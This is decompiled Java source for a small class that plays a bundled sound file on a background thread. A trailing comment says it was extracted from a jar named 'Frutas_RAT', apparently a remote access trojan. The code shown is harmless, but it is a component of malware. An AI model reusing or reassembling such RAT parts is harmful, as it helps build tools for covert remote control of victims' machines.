/*    */ package Extras;
/*    */ 
/*    */ import sun.audio.AudioDevice;
/*    */ import sun.audio.AudioPlayer;
/*    */ 
/*    */ public class Sonid extends Thread
/*    */ {
/*  8 */   private static AudioDevice d = AudioDevice.device;
/*    */ 
/*    */   public void run()
/*    */   {
/* 15 */     AudioPlayer v = AudioPlayer.player;
/* 16 */     v.start(getClass().getResourceAsStream("type.wav"));
/*    */ 
/* 22 */     System.gc();
/*    */   }
/*    */   public static void main(String[] args) throws InterruptedException {
/* 25 */     new Sonid().start();
/*    */   }
/*    */ }

/* Location:           C:\Users\Danilo\Desktop\Coisas\Frutas_RAT.jar
 * Qualified Name:     Extras.Sonid
 * JD-Core Version:    0.6.2
 */